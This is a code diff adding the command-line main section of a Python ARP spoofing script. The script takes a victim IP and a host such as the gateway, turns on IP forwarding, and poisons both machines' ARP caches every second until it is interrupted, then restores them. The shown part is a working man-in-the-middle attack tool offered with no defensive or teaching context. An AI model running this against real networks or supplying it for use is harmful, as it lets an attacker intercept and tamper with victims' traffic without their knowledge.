@@ -67,3 +67,28 @@ def restore(target_ip, host_ip, verbose=True):
     send(arp_response, verbose=0, count=7)
     if verbose:
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+
+
+## the main function
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="ARP spoof script")
+    parser.add_argument("-T", "--target", help="Victim IP Address to ARP poison")
+    parser.add_argument("-H", "--host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
+    args = parser.parse_args()
+    target, host, verbose = args.target, args.host, args.verbose
+
+    enable_ip_route()
+    try:
+        while True:
+            spoof(target, host, verbose)
+
+            spoof(host, target, verbose)
+
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("[!] Detected CTRL+C ! restoring the network, please wait...")
+        restore(target, host)
+
+        restore(host, target)
